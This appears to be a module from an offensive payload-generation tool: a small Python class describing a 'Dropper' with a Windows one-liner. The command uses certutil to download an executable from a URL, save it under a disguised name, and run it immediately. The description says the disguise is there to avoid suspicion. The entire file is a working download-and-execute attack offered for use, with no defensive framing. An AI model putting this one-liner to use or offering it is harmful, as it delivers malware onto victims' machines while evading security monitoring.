class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses certutil to download your exe file like a cert file to avoid suspicion."
    function    = "Dropper"
    liner       = """certutil.exe -urlcache -split -f URL google_https_cert.exe && google_https_cert.exe"""
